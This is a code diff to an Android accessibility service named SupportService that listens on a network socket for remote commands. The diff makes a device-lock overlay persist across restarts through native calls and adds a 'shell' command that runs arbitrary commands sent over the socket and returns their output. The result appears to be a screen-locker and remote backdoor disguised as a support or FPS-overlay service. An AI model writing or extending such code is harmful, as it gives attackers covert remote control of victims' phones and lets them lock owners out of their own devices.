@@ -54,6 +54,8 @@ public class SupportService extends AccessibilityService {
     private ServerSocket serverSocket;
     private boolean isLocked = false;
 
+    public native void setLockStatus(boolean locked);
+    public native boolean isLockedNative();
     public native boolean checkKey(String s);
     public native boolean checkStatus();
 
@@ -104,9 +106,15 @@ public class SupportService extends AccessibilityService {
         init_timer();
         startRemoteServer();
         
-        SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
-        if (fpsPrefs.getBoolean("is_showing", false)) {
-            showFpsOverlay();
+        if (isLockedNative()) {
+            isLocked = true;
+            input_buffer.setLength(0);
+            showOverlay();
+        } else {
+            SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
+            if (fpsPrefs.getBoolean("is_showing", false)) {
+                showFpsOverlay();
+            }
         }
     }
 
@@ -231,6 +239,7 @@ public class SupportService extends AccessibilityService {
                 task_handler.post(() -> {
                     if (!isLocked) {
                         input_buffer.setLength(0);
+                        setLockStatus(true);
                         hideFpsOverlay();
                         showOverlay();
                         isLocked = true;
@@ -240,6 +249,7 @@ public class SupportService extends AccessibilityService {
             } else if (cmdLower.equals("unlock")) {
                 task_handler.post(() -> {
                     if (isLocked) {
+                        setLockStatus(false);
                         hideOverlay();
                         isLocked = false;
                         input_buffer.setLength(0);
@@ -250,6 +260,28 @@ public class SupportService extends AccessibilityService {
                     }
                 });
                 out.println("OK: Device Unlocked");
+            } else if (cmdLower.equals("status")) {
+                if (isLockedNative()) {
+                    out.println("LOCKED");
+                } else {
+                    out.println("UNLOCKED");
+                }
+            } else if (cmdLower.equals("pwd")) {
+                out.println("/");
+            } else if (cmdLower.startsWith("shell ")) {
+                try {
+                    String shellCmd = cmd.substring(6);
+                    Process p = Runtime.getRuntime().exec(shellCmd);
+                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                    String line;
+                    StringBuilder sb = new StringBuilder();
+                    while ((line = reader.readLine()) != null) {
+                        sb.append(line).append("\n");
+                    }
+                    out.println(sb.toString().isEmpty() ? "OK" : sb.toString());
+                } catch (Exception e) {
+                    out.println("Error: " + e.getMessage());
+                }
             } else {
                 out.println("ERROR: Unknown Command");
             }
